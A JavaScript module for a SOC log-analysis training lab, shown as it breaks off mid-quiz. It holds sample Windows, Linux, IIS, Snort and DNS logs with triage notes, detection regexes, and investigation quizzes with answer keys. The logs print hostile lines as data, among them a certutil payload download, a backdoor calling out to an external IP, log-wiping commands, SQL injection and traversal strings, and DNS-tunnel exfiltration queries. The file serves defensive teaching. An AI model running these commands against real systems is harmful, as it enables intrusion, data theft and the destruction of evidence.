// =========================================================================
// Log Analysis Lab & SIEM Investigation Hub (EC-Council CSA v2)
// Comprehensive interactive decoder, regex sandbox, reference library,
// and real-world SOC investigation mini-labs.
// =========================================================================

import { StorageManager } from './storage.js';

export const LogAnalysisView = {
  currentSubTab: 'decoder',
  activeCaseIndex: 0,
  activeLibCategory: 'windows',
  libSearchQuery: '',

  // Library of real-world log samples for instant loading & decoding
  logPresets: [
    {
      id: "win-bf",
      category: "Windows Security",
      name: "Windows Event 4625 - Failed Logon (Brute-Force Anomaly)",
      raw: `2026-09-30 08:14:22 [Security-Auditing] EventID=4625 Level=Information Keywords="Audit Failure" Computer="CORP-DC01.corp.internal" SecurityID="NULL SID" AccountName="Administrator" AccountDomain="CORP" FailureReason="%%2313" SubStatus="0xC000006A" LogonType=3 CallerProcessName="C:\\Windows\\System32\\lsass.exe" WorkstationName="WORKSTATION-42" SourceNetworkAddress="192.168.10.45" SourcePort="49821" ProcessName="-" AuthenticationPackage="MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"`,
      parsed: {
        timestamp: "2026-09-30 08:14:22",
        source: "Microsoft Windows Security Auditing",
        eventId: "4625 (Logon Failure)",
        computer: "CORP-DC01.corp.internal",
        user: "Administrator",
        domain: "CORP",
        logonType: "3 (Network - SMB/RPC)",
        sourceIp: "192.168.10.45",
        sourcePort: "49821",
        subStatus: "0xC000006A (STATUS_WRONG_PASSWORD)",
        severity: "High",
        threat: "Credential Brute-Force / Password Spraying against Domain Administrator",
        mitre: "T1110.001 - Password Guessing / Brute Force",
        triage: "The Domain Controller recorded authentication failure for 'Administrator'. SubStatus 0xC000006A confirms the account exists but the attacker supplied an invalid password over a Type 3 Network SMB connection from 192.168.10.45.",
        recommendations: [
          "Check SIEM for burst frequency: >10 attempts in 60s from 192.168.10.45.",
          "Isolate host 192.168.10.45 immediately via EDR.",
          "Check Event ID 4740 for potential lockout and verify whether any subsequent Event 4624 occurred."
        ]
      }
    },
    {
      id: "win-lat",
      category: "Windows Security",
      name: "Windows Event 4624 (Logon Type 3) + 7045 - Service Backdoor",
      raw: `2026-09-30 08:22:10 [Security-Auditing] EventID=4624 Level=Information Keywords="Audit Success" Computer="DB-SRV01.corp.internal" TargetUserName="svc_backup" TargetDomainName="CORP" LogonType=3 AuthenticationPackage="Kerberos" WorkstationName="DEV-LAPTOP-09" SourceNetworkAddress="10.0.5.88" SourcePort="51234" ElevatedToken="%%1842"\n2026-09-30 08:22:14 [Service Control Manager] EventID=7045 Level=Information ServiceName="PSEXESVC" ServiceFileName="%SystemRoot%\\PSEXESVC.exe" ServiceType="user mode service" ServiceStartType="demand start" ServiceAccount="LocalSystem"`,
      parsed: {
        timestamp: "2026-09-30 08:22:10 - 08:22:14",
        source: "Windows Security & Service Control Manager",
        eventId: "4624 (Success) + 7045 (New Service Installed)",
        computer: "DB-SRV01.corp.internal",
        user: "svc_backup (Elevated Token)",
        domain: "CORP",
        logonType: "3 (Network Connection)",
        sourceIp: "10.0.5.88",
        sourcePort: "51234",
        subStatus: "N/A (Success)",
        severity: "Critical",
        threat: "Lateral Movement via PsExec / Service Execution with Compromised Service Account",
        mitre: "T1021.002 - SMB/Windows Admin Shares & T1543.003 - Windows Service Creation",
        triage: "Attacker used compromised credentials of 'svc_backup' from IP 10.0.5.88 to authenticate over SMB (Type 3) and immediately deployed the 'PSEXESVC' service running as LocalSystem for remote execution.",
        recommendations: [
          "Execute 'Deprovisioning Users SOAR Playbook' to terminate svc_backup sessions and rotate Kerberos TGT.",
          "Quarantine DB-SRV01 and inspect RAM/disk for dropped binaries.",
          "Check firewall logs for C2 beaconing from DB-SRV01."
        ]
      }
    },
    {
      id: "win-cleanup",
      category: "Windows Security",
      name: "Windows Event 1102 - Security Audit Log Cleared (Anti-Forensics)",
      raw: `2026-09-30 08:45:01 [Security-Auditing] EventID=1102 Level=Information Keywords="Audit Success" TaskCategory="Log clear" Computer="WIN-FINANCE-03.corp.internal" SubjectUserSid="S-1-5-21-394829-500" SubjectUserName="adm_oval" SubjectDomainName="CORP" SubjectLogonId="0x4F12A" ClientProcessId="4812" ClientProcess="C:\\Windows\\System32\\wevtutil.exe"`,
      parsed: {
        timestamp: "2026-09-30 08:45:01",
        source: "Microsoft-Windows-Eventlog",
        eventId: "1102 (The audit log was cleared)",
        computer: "WIN-FINANCE-03.corp.internal",
        user: "adm_oval",
        domain: "CORP",
        logonType: "Local Administrative Execution",
        sourceIp: "Local / Host",
        sourcePort: "N/A",
        subStatus: "N/A",
        severity: "Critical",
        threat: "Defense Evasion & Anti-Forensics Log Destruction (wevtutil.exe cl Security)",
        mitre: "T1070.001 - Indicator Removal: Clear Windows Event Logs",
        triage: "The Windows Security event log on host WIN-FINANCE-03 was deliberately wiped by user 'adm_oval' using `wevtutil.exe`. This is a signature indicator of an adversary attempting to destroy evidence following an intrusion.",
        recommendations: [
          "Verify if SIEM central forwarder already captured historical logs prior to local clearing.",
          "Immediately preserve volatile RAM on WIN-FINANCE-03.",
          "Disable account 'adm_oval' and inspect Domain Controller logs for unauthorized privilege escalation."
        ]
      }
    },
    {
      id: "sysmon-proc",
      category: "Sysmon & EDR",
      name: "Sysmon Event 1 - Suspicious Web Shell Process Lineage & Lolbin Execution",
      raw: `2026-09-30 09:12:33 [Microsoft-Windows-Sysmon] EventID=1 Level=Information Computer="WEB-IIS-EXTERNAL" UtcTime="2026-09-30 12:12:33.412" ProcessGuid="{A12F-4982}" ProcessId="6104" Image="C:\\Windows\\System32\\certutil.exe" FileVersion="10.0.19041.1" Description="CertUtil.exe" CommandLine="certutil.exe -urlcache -split -f http://185.220.101.5/beacon.exe C:\\ProgramData\\beacon.exe" CurrentDirectory="C:\\inetpub\\wwwroot\\uploads\\" User="NT AUTHORITY\\IUSR" ParentProcessGuid="{B441-9901}" ParentProcessId="2840" ParentImage="C:\\Windows\\System32\\cmd.exe" ParentCommandLine="cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.5/beacon.exe C:\\ProgramData\\beacon.exe" Hashes="MD5=2F48A9C1284E,SHA256=A8B2C4E91029384756..."`,
      parsed: {
        timestamp: "2026-09-30 12:12:33.412 UTC",
        source: "Microsoft-Windows-Sysmon (Event 1)",
        eventId: "1 (Process Creation)",
        computer: "WEB-IIS-EXTERNAL",
        user: "NT AUTHORITY\\IUSR",
        domain: "NT AUTHORITY",
        logonType: "IIS Worker Process Context",
        sourceIp: "185.220.101.5 (External C2/Staging)",
        sourcePort: "80 (HTTP)",
        subStatus: "Parent: cmd.exe (spawned by w3wp.exe)",
        severity: "Critical",
        threat: "Web Shell Ingress Tool Transfer via Living-off-the-Land Binary (CertUtil.exe)",
        mitre: "T1105 - Ingress Tool Transfer & T1059.003 - Windows Command Shell & T1505.003 - Web Shell",
        triage: "The IIS web server account `IUSR` spawned `cmd.exe` from the web directory `C:\\inetpub\\wwwroot\\uploads\\` to execute `certutil.exe` to download a binary `beacon.exe` from an external malicious IP 185.220.101.5.",
        recommendations: [
          "Kill process ID 6104 and remove payload `C:\\ProgramData\\beacon.exe`.",
          "Block outbound traffic to IP 185.220.101.5 on perimeter firewall.",
          "Examine IIS W3C web access logs to identify the uploaded web shell script in `/uploads/`."
        ]
      }
    },
    {
      id: "iis-sqli",
      category: "Web Server (IIS W3C)",
      name: "Microsoft IIS W3C Log - SQL Injection Tautology & Data Exfiltration",
      raw: `#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n#Date: 2026-09-30 09:30:15\n#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken\n2026-09-30 09:30:15 192.168.1.10 GET /products/catalog.aspx id=1%27+UNION+SELECT+null,username,password,credit_card+FROM+users-- 443 - 45.33.32.156 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://corp.com/products 200 0 0 148920 412 850`,
      parsed: {
        timestamp: "2026-09-30 09:30:15",
        source: "Microsoft IIS W3C Web Server Log (%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1)",
        eventId: "W3C Extended Request Entry",
        computer: "Web Server (192.168.1.10:443)",
        user: "Anonymous / Unauthenticated",
        domain: "Public Web",
        logonType: "HTTPS Web Request",
        sourceIp: "45.33.32.156 (Attacker IP)",
        sourcePort: "443 (Server Port)",
        subStatus: "sc-status=200 sc-substatus=0 sc-bytes=148920",
        severity: "Critical",
        threat: "SQL Injection (UNION-based) Resulting in Successful Database Exfiltration (HTTP 200 + 148KB payload)",
        mitre: "T1190 - Exploit Public-Facing Application & T1567 - Exfiltration Over Web Service",
        triage: "Attacker 45.33.32.156 passed a UNION SQL injection payload in `cs-uri-query` against `/products/catalog.aspx`. The server returned `sc-status 200` with an abnormally large response body `sc-bytes: 148,920` (148 KB), confirming sensitive user database extraction.",
        recommendations: [
          "Deploy immediate WAF signature blocking UNION SELECT patterns and URL-encoded quotes (`%27`).",
          "Apply parameterized queries (Prepared Statements) in `catalog.aspx` backend code.",
          "Check database query audit logs (`log_statement` / SQL Profiler) to determine full extent of leaked records."
        ]
      }
    },
    {
      id: "iis-traversal",
      category: "Web Server (IIS W3C)",
      name: "Microsoft IIS W3C Log - Directory / Path Traversal Scanning",
      raw: `2026-09-30 09:41:02 192.168.1.10 GET /view_document.aspx file=..%2f..%2f..%2f..%2fwindows%2fwin.ini 443 - 198.51.100.77 Nikto/2.1.6 - 200 0 0 1520 310 45\n2026-09-30 09:41:03 192.168.1.10 GET /view_document.aspx file=..%252f..%252f..%252fetc%252fpasswd 443 - 198.51.100.77 Nikto/2.1.6 - 404 0 2 340 325 12`,
      parsed: {
        timestamp: "2026-09-30 09:41:02 - 09:41:03",
        source: "Microsoft IIS W3C Web Server Log",
        eventId: "W3C Extended Request Entry",
        computer: "Web Server (192.168.1.10)",
        user: "Anonymous",
        domain: "Public Web",
        logonType: "HTTPS Web Request",
        sourceIp: "198.51.100.77",
        sourcePort: "443",
        subStatus: "200 (Success) & 404 (Not Found)",
        severity: "High",
        threat: "Automated Directory Traversal Vulnerability Scan (Nikto Scanner / LFI Exploitation)",
        mitre: "T1595.002 - Active Scanning: Vulnerability Scanning & T1083 - File and Directory Discovery",
        triage: "Scanner `Nikto/2.1.6` from IP 198.51.100.77 tested URL-encoded traversal payloads (`..%2f` and double-encoded `..%252f`). The first request retrieved `windows/win.ini` with status 200 OK.",
        recommendations: [
          "Block source IP 198.51.100.77 on perimeter WAF.",
          "Implement canonical path validation and restrict web application permissions strictly within web root.",
          "Audit `view_document.aspx` to sanitize input and disallow dot-dot-slash patterns."
        ]
      }
    },
    {
      id: "linux-auth",
      category: "Linux & Syslog",
      name: "Linux /var/log/auth.log - SSH Brute Force & Sudo Privilege Escalation",
      raw: `Sep 30 08:30:01 bastion sshd[14210]: Failed password for invalid user admin from 203.0.113.88 port 41202 ssh2\nSep 30 08:30:04 bastion sshd[14212]: Failed password for invalid user test from 203.0.113.88 port 41208 ssh2\nSep 30 08:30:15 bastion sshd[14220]: Accepted publickey for developer from 203.0.113.88 port 41250 ssh2: RSA SHA256:4K9xL2...\nSep 30 08:30:22 bastion sudo[14235]: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash`,
      parsed: {
        timestamp: "Sep 30 08:30:01 - 08:30:22",
        source: "Linux /var/log/auth.log (Syslog Facility: auth/authpriv, Severity: 6-info / 3-err)",
        eventId: "SSHD Authentication & Sudo Elevation",
        computer: "bastion",
        user: "developer (elevated to root)",
        domain: "Local Linux System",
        logonType: "SSH Remote Session + Sudo Shell",
        sourceIp: "203.0.113.88",
        sourcePort: "41250 (SSH2)",
        subStatus: "Accepted publickey after multiple PAM failures",
        severity: "Critical",
        threat: "Compromised SSH Key Usage followed by Immediate Root Shell Elevation via Sudo",
        mitre: "T1078.003 - Local Accounts & T1548.003 - Sudo and Sudo Caching",
        triage: "IP 203.0.113.88 first attempted username guessing (admin, test), then logged in successfully as 'developer' using a compromised SSH private key and immediately spawned an interactive root shell via `/bin/bash` with sudo.",
        recommendations: [
          "Terminate active pts/0 session via `pkill -u developer`.",
          "Revoke public key `4K9xL2...` from `~developer/.ssh/authorized_keys`.",
          "Review `/var/log/audit/audit.log` for root commands executed during the compromise."
        ]
      }
    },
    {
      id: "snort-ids",
      category: "Network & IDS",
      name: "Snort IDS Alert - SQL Injection Tautology Rule Match",
      raw: `[**] [1:1000001:1] WEB-ATTACK SQL Injection Tautology Bypass [**]\n[Classification: Web Application Attack] [Priority: 1]\n09/30-09:50:11.890123 203.0.113.50:54210 -> 192.168.1.10:80\nTCP TTL:64 TOS:0x0 ID:48219 IpLen:20 DgmLen:480 DF\n***AP*** Seq: 0x94B2C1 Ack: 0x1A02E Win: 0x7FFF TcpLen: 32\nPayload:\n47 45 54 20 2f 6c 6f 67 69 6e 2e 70 68 70 3f 75  GET /login.php?u\n73 65 72 3d 27 20 4f 52 20 54 3d 54 20 2d 2d 20  ser=' OR T=T -- \n48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20  HTTP/1.1..Host: `,
      parsed: {
        timestamp: "09/30 09:50:11.890123",
        source: "Snort IDS / Suricata (SID: 1000001, Rev: 1)",
        eventId: "Rule Alert (Priority: 1 - High)",
        computer: "Sensor: DMZ-TAP01 (Inspecting 192.168.1.10:80)",
        user: "Unauthenticated Web Client",
        domain: "DMZ Network",
        logonType: "TCP Stream Ingress",
        sourceIp: "203.0.113.50",
        sourcePort: "54210 -> 80 (HTTP)",
        subStatus: "Rule match: content:\"' OR T=T\"",
        severity: "High",
        threat: "Web Authentication Bypass Attempt via SQL Injection Tautology (' OR T=T --)",
        mitre: "T1190 - Exploit Public-Facing Application",
        triage: "Snort IDS rule matched exact signature `content:\"' OR T=T\"` in the HTTP GET request buffer aimed at `/login.php` on the corporate web server.",
        recommendations: [
          "Confirm whether the backend web server returned HTTP 200 or 403.",
          "Verify if the web application utilizes parameterized SQL queries.",
          "Add dynamic firewall drop rule for source IP 203.0.113.50."
        ]
      }
    },
    {
      id: "dns-tunnel",
      category: "Network & DNS",
      name: "DNS Query Log - High-Entropy Subdomain Tunneling Exfiltration",
      raw: `2026-09-30 10:02:11.450 client 10.0.3.15#59812: query: aW5maWx0cmF0aW9uLXNlY3JldC1rZXktZGF0YQ.c2Vzc2lvbi05ODQx.attacker-c2.com IN TXT + (10.0.1.10)\n2026-09-30 10:02:12.110 client 10.0.3.15#59814: query: dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9UDRz.c2Vzc2lvbi05ODQx.attacker-c2.com IN TXT + (10.0.1.10)\n2026-09-30 10:02:12.890 client 10.0.3.15#59818: query: c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFB.c2Vzc2lvbi05ODQx.attacker-c2.com IN TXT + (10.0.1.10)`,
      parsed: {
        timestamp: "2026-09-30 10:02:11 - 10:02:12",
        source: "BIND / Windows DNS Server Query Log",
        eventId: "DNS Query Stream",
        computer: "DNS Resolver (10.0.1.10:53)",
        user: "Host: 10.0.3.15",
        domain: "attacker-c2.com",
        logonType: "DNS Transport (Port 53 UDP)",
        sourceIp: "10.0.3.15 (Internal Infected Host)",
        sourcePort: "59812 - 59818 -> 53 (DNS)",
        subStatus: "Record Type: TXT (Base64 Encoded Payloads)",
        severity: "Critical",
        threat: "DNS Tunneling & Data Exfiltration via High-Entropy Subdomains (Iodine / DNScat2)",
        mitre: "T1071.004 - Application Layer Protocol: DNS & T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol",
        triage: "Internal host 10.0.3.15 is exfiltrating Base64 encoded sensitive strings (decoding `aW5maWx0...` reveals `infiltration-secret-key-data` and `username=admin...`) by crafting rapid DNS TXT queries to authoritative nameserver `attacker-c2.com`.",
        recommendations: [
          "Immediately sinkhole domain `attacker-c2.com` on internal DNS resolvers.",
          "Isolate internal host 10.0.3.15 and perform deep EDR memory inspection.",
          "Deploy DNS inspection rules to block high-entropy subdomains >40 characters."
        ]
      }
    }
  ],

  // Regex presets for SOC investigation sandbox
  regexPresets: [
    {
      name: "Directory / Path Traversal Pattern",
      pattern: "/(.|(%|%25)2E)(.|(%|%25)2E)(\\/|(%|%25)2F|\\\\|(%|%25)5C)/i",
      regex: /(.|(%|%25)2E)(.|(%|%25)2E)(\/|(%|%25)2F|\\|(%|%25)5C)/gi,
      sample: "GET /download.aspx?file=..%2F..%2Fwindows%2Fwin.ini HTTP/1.1\nGET /images/logo.png HTTP/1.1\nGET /view.php?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1",
      explanation: "Matches `../`, `..\\`, URL-encoded `%2E%2E%2F`, `%2E%2E%5C`, and double-encoded `%252E%252E%252F` used in Path Traversal & LFI attacks."
    },
    {
      name: "SQL Injection Tautology / Boolean Regex",
      pattern: "('|\%27)(\\s+)?(or|and)(\\s+)?([\\w\\d]+)(\\s+)?=(\\s+)?([\\w\\d]+)",
      regex: /('|\%27)(\s+)?(or|and)(\s+)?([\w\d]+)(\s+)?=(\s+)?([\w\d]+)/gi,
      sample: "SELECT * FROM users WHERE user='' OR 1=1' AND pass=''\nGET /login.php?u=admin%27%20OR%20T=T%20--\nGET /items?category=books HTTP/1.1",
      explanation: "Detects classic tautology injections (`' OR 1=1`, `' OR T=T`, `' OR 'a'='a'`) that evaluate to true to bypass authentication."
    },
    {
      name: "Hexadecimal Sequence Pattern",
      pattern: "([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})",
      regex: /\b([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})\b/g,
      sample: "Color codes: #FF5733, #00A, #FFFFFF, invalid: #XYZ123, memory: 0x4F12AB",
      explanation: "Matches 3-character shorthand and 6-character full hexadecimal strings frequently used in payload analysis and log extraction."
    },
    {
      name: "IPv4 Address Extractor",
      pattern: "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b",
      regex: /\b(?:\d{1,3}\.){3}\d{1,3}\b/g,
      sample: "Failed login from 192.168.10.45 port 49821 targeting DC at 10.0.0.1, external proxy: 203.0.113.88",
      explanation: "Extracts standard dotted-quad IPv4 addresses from raw, unstructured log lines."
    },
    {
      name: "Base64 Payload String Extractor",
      pattern: "[A-Za-z0-9+/]{24,}={0,2}",
      regex: /[A-Za-z0-9+/]{24,}={0,2}/g,
      sample: "query: aW5maWx0cmF0aW9uLXNlY3JldC1rZXktZGF0YQ.c2Vzc2lvbi05ODQx.attacker-c2.com IN TXT\npowershell -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
      explanation: "Identifies Base64 strings of length 24+ characters frequently used in obfuscated PowerShell scripts and DNS tunneling."
    },
    {
      name: "Suspicious Automated Security Scanner User-Agents",
      pattern: "(?i)(sqlmap|nikto|nmap|dirbuster|gobuster|acunetix|masscan|hydra)",
      regex: /(sqlmap|nikto|nmap|dirbuster|gobuster|acunetix|masscan|hydra)/gi,
      sample: "Mozilla/5.0 (Windows NT 10.0)\nNikto/2.1.6 (Evasions:None) (Test:Port Check)\nsqlmap/1.6#stable (https://sqlmap.org)\nMozilla/5.0 (compatible; Nmap Scripting Engine)",
      explanation: "Detects well-known reconnaissance and exploit automation scanners in HTTP `User-Agent` log fields."
    }
  ],

  // 5 Real-world hands-on SOC Case Investigations (Mini-Labs)
  investigationCases: [
    {
      id: "case-1",
      title: "Case 1: Lateral Movement & Rogue Service Persistence",
      difficulty: "Medium",
      badge: "Windows Forensics",
      scenario: `Your SIEM triggered a high-severity alert 'Anomalous Lateral Movement & Remote Service Creation' on production database server 'SRV-PROD-DB01'. As the Tier 1/2 SOC Analyst on duty, inspect the multiline Windows Security and System event stream below, determine the attacker's ingress point, compromised account, and persistence technique.`,
      rawLogs: `2026-09-30 03:14:02.100 CORP-DC01 Security-Auditing 4776: The domain controller attempted to validate the credentials for an account. Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 Logon Account: svc_sqlbackup Source Workstation: WS-FIN-088 Error Code: 0x0
2026-09-30 03:14:03.450 SRV-PROD-DB01 Security-Auditing 4624: An account was successfully logged on. SubjectUserSid: S-1-0-0 TargetUserName: svc_sqlbackup TargetDomainName: CORP LogonType: 3 WorkstationName: WS-FIN-088 SourceNetworkAddress: 10.200.4.88 SourcePort: 52104 ElevatedToken: Yes
2026-09-30 03:14:03.500 SRV-PROD-DB01 Security-Auditing 4672: Special privileges assigned to new logon. SubjectUserName: svc_sqlbackup PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege
2026-09-30 03:14:08.120 SRV-PROD-DB01 Service Control Manager 7045: A service was installed in the system. Service Name: SysInternalBackdoor Service File Name: C:\\Windows\\Temp\\backdoor.exe Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem
2026-09-30 03:14:09.900 SRV-PROD-DB01 Microsoft-Windows-Sysmon 1: Process Create: UtcTime: 2026-09-30 03:14:09.890 ProcessId: 7120 Image: C:\\Windows\\Temp\\backdoor.exe CommandLine: "C:\\Windows\\Temp\\backdoor.exe" --connect 198.51.100.44:4444 ParentImage: C:\\Windows\\System32\\services.exe User: NT AUTHORITY\\SYSTEM`,
      questions: [
        {
          id: "q1",
          question: "What logon type was recorded in Event ID 4624, and what connection vector does it represent?",
          options: [
            "Logon Type 2: Direct Interactive Console Login",
            "Logon Type 3: Network Connection (SMB / RPC / Lateral Movement)",
            "Logon Type 10: Remote Desktop Protocol (RDP)",
            "Logon Type 4: Scheduled Batch Job"
          ],
          correct: 1,
          explanation: "Logon Type 3 indicates a Network logon (such as SMB or administrative share access). When combined with Event 7045, it confirms remote lateral movement."
        },
        {
          id: "q2",
          question: "Which compromised account was utilized by the adversary to gain elevated access?",
          options: [
            "Administrator",
            "svc_sqlbackup",
            "LocalSystem",
            "WS-FIN-088"
          ],
          correct: 1,
          explanation: "Event 4624 and 4672 show `svc_sqlbackup` authenticating from `WS-FIN-088` and receiving `SeDebugPrivilege`."
        },
        {
          id: "q3",
          question: "What persistence artifact was created on the system as recorded in Event ID 7045?",
          options: [
            "A registry Run key in HKCU",
            "A scheduled task named backdoor.exe",
            "A Windows Service named 'SysInternalBackdoor' pointing to 'C:\\Windows\\Temp\\backdoor.exe'",
            "A local shadow copy deletion"
          ],
          correct: 2,
          explanation: "Event 7045 records the creation of service 'SysInternalBackdoor' executing `C:\\Windows\\Temp\\backdoor.exe` with LocalSystem privilege."
        },
        {
          id: "q4",
          question: "What is the primary IP and port of the attacker's external Command & Control (C2) server?",
          options: [
            "10.200.4.88:52104",
            "198.51.100.44:4444",
            "CORP-DC01:88",
            "127.0.0.1:8080"
          ],
          correct: 1,
          explanation: "Sysmon Event 1 shows `backdoor.exe` executing with argument `--connect 198.51.100.44:4444`."
        }
      ]
    },
    {
      id: "case-2",
      title: "Case 2: Web Server SQLi & Massive Data Exfiltration",
      difficulty: "High",
      badge: "Web Forensics",
      scenario: `The Network Security Monitoring team noticed an anomaly in outbound traffic volume from the DMZ web server 'IIS-WEB-01'. You are tasked with analyzing the IIS W3C web access log snippet below to identify the exact injection attack, the attacker's IP, and confirm whether data was leaked.`,
      rawLogs: `#Software: Microsoft Internet Information Services 10.0
#Date: 2026-09-30 04:10:00
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
2026-09-30 04:10:12 10.10.1.50 GET /api/search.aspx q=laptop 443 - 203.0.113.195 Mozilla/5.0 - 200 0 0 4520 210 32
2026-09-30 04:10:18 10.10.1.50 GET /api/search.aspx q=%27+OR+1%3D1-- 443 - 203.0.113.195 Mozilla/5.0 - 200 0 0 89200 310 120
2026-09-30 04:10:25 10.10.1.50 GET /api/search.aspx q=%27+UNION+SELECT+null,username,password_hash,credit_card_num+FROM+tbl_customers-- 443 - 203.0.113.195 Mozilla/5.0 - 200 0 0 4920150 480 1850
2026-09-30 04:10:30 10.10.1.50 GET /api/search.aspx q=phone 443 - 10.0.2.14 Mozilla/5.0 - 200 0 0 4800 205 28`,
      questions: [
        {
          id: "q1",
          question: "What is the IP address of the attacker performing the web exploit?",
          options: [
            "10.10.1.50",
            "203.0.113.195",
            "10.0.2.14",
            "127.0.0.1"
          ],
          correct: 1,
          explanation: "In IIS W3C format, `c-ip` represents the client IP (203.0.113.195), while `s-ip` is the internal web server IP (10.10.1.50)."
        },
        {
          id: "q2",
          question: "What specific attack vector was executed on `2026-09-30 04:10:25`?",
          options: [
            "Cross-Site Scripting (XSS)",
            "UNION-based SQL Injection targeting customer credentials and credit cards",
            "Directory Traversal to /etc/passwd",
            "Buffer Overflow against search.aspx"
          ],
          correct: 1,
          explanation: "The query string `q=%27+UNION+SELECT+null,username,password_hash,credit_card_num+FROM+tbl_customers--` is a classic UNION-based SQL Injection."
        },
        {
          id: "q3",
          question: "What forensic metric in the log confirms successful data exfiltration?",
          options: [
            "`time-taken` was only 32ms",
            "`sc-status` was 500 Internal Server Error",
            "`sc-bytes` spiked dramatically to 4,920,150 bytes (~4.92 MB) with `sc-status 200`",
            "`cs-bytes` was 0"
          ],
          correct: 2,
          explanation: "The `sc-bytes` field represents bytes sent from Server to Client. A spike from ~4.5KB to ~4.92MB with HTTP status 200 confirms the database records were dumped into the HTTP response."
        }
      ]
    },
    {
      id: "case-3",
      title: "Case 3: Linux SSH Brute Force & Audit Log Tampering",
      difficulty: "High",
      badge: "Linux Syslog",
      scenario: `A critical Linux server hosting sensitive intellectual property generated high-severity alerts. Review `/var/log/auth.log` and the audit system events to determine how the attacker gained access and what defense evasion techniques were employed.`,
      rawLogs: `Sep 30 05:12:01 srv-core sshd[28101]: Failed password for invalid user root from 198.51.100.12 port 49102 ssh2
Sep 30 05:12:03 srv-core sshd[28104]: Failed password for invalid user admin from 198.51.100.12 port 49106 ssh2
Sep 30 05:12:05 srv-core sshd[28109]: Failed password for invalid user test from 198.51.100.12 port 49110 ssh2
Sep 30 05:12:18 srv-core sshd[28120]: Accepted password for sysadmin from 198.51.100.12 port 49144 ssh2
Sep 30 05:12:20 srv-core sudo[28135]: sysadmin : TTY=pts/1 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/su -
Sep 30 05:12:35 srv-core kernel: [91842.12] audit: type=1100 audit(1727673155.812:491): pid=28140 uid=0 auid=1000 ses=3 msg='op=PAM:setcred grantors=pam_rootok acct="root" exe="/bin/su" hostname=? addr=? terminal=pts/1 res=success'
Sep 30 05:12:50 srv-core sudo[28190]: root : COMMAND=/bin/rm -rf /var/log/auth.log /var/log/wtmp /var/log/btmp`,
      questions: [
        {
          id: "q1",
          question: "What initial attack pattern is evident between 05:12:01 and 05:12:05 in `/var/log/auth.log`?",
          options: [
            "Port scanning via Nmap",
            "SSH Credential Brute-Force / Username Guessing from 198.51.100.12",
            "Slowloris DoS attack",
            "DNS Amplification attack"
          ],
          correct: 1,
          explanation: "Rapid consecutive 'Failed password for invalid user' messages from IP 198.51.100.12 indicate automated SSH brute force / username guessing."
        },
        {
          id: "q2",
          question: "Which user account was successfully compromised by the attacker at 05:12:18?",
          options: [
            "root",
            "admin",
            "sysadmin",
            "test"
          ],
          correct: 2,
          explanation: "`Accepted password for sysadmin from 198.51.100.12` confirms the `sysadmin` account was compromised."
        },
        {
          id: "q3",
          question: "What defense evasion action did the attacker take at 05:12:50?",
          options: [
            "Configured a cron job to restart the server",
            "Attempted anti-forensics by deleting `/var/log/auth.log`, `/var/log/wtmp`, and `/var/log/btmp`",
            "Installed a rootkit in `/etc/modules`",
            "Changed the SSH listening port to 2222"
          ],
          correct: 1,
          explanation: "The command `rm -rf /var/log/auth.log /var/log/wtmp /var/log/btmp` was executed to erase authentication logs and login history databases."
        }
      ]
    },
    {
      id: "case-4",
      title: "Case 4: DNS Tunneling Data Exfiltration",
      difficulty: "Medium",
      badge: "Network DNS",
      scenario: `The SOC sensor flagged anomalous DNS query volume originating from an internal accounting workstation 'WS-ACC-04' towards an external unclassified domain. Examine the DNS query log below.`,
      rawLogs: `2026-09-30 06:01:00.120 client 10.0.10.45#51204 (WS-ACC-04): query: aW52b2ljZS1zZWNyZXQtMjAyNi5wZGY.chunk01.ns1.darktunnel-c2.net IN TXT + (10.0.0.10)
2026-09-30 06:01:00.450 client 10.0.10.45#51206 (WS-ACC-04): query: Q0NfREVUQUlMU180MTEyXzk4MDFfMTIyMw.chunk02.ns1.darktunnel-c2.net IN TXT + (10.0.0.10)
2026-09-30 06:01:00.890 client 10.0.10.45#51210 (WS-ACC-04): query: UGFzc3dvcmRzX0JhY2t1cF8yMDI2LnR4dA.chunk03.ns1.darktunnel-c2.net IN TXT + (10.0.0.10)
2026-09-30 06:01:01.320 client 10.0.10.45#51212 (WS-ACC-04): query: SU5URVJOQUxfRklOQU5DRV9SRVBPUlQ.chunk04.ns1.darktunnel-c2.net IN TXT + (10.0.0.10)`,
      questions: [
        {
          id: "q1",
          question: "What DNS record type is being leveraged to transport the exfiltrated chunks?",
          options: [
            "A record (IPv4 address resolution)",
            "TXT record (Text string payload encapsulation)",
            "MX record (Mail exchange)",
            "PTR record (Reverse lookup)"
          ],
          correct: 1,
          explanation: "DNS Tunneling tools (e.g. Iodine, DNScat2) frequently use `TXT` queries because they can carry large text payloads in query names and responses."
        },
        {
          id: "q2",
          question: "Decoding the Base64 subdomain in chunk 2 (`Q0NfREVUQUlMU180MTEyXzk4MDFfMTIyMw`) reveals which stolen asset?",
          options: [
            "invoice-secret-2026.pdf",
            "CC_DETAILS_4112_9801_1223 (Credit Card Details)",
            "Passwords_Backup_2026.txt",
            "INTERNAL_FINANCE_REPORT"
          ],
          correct: 1,
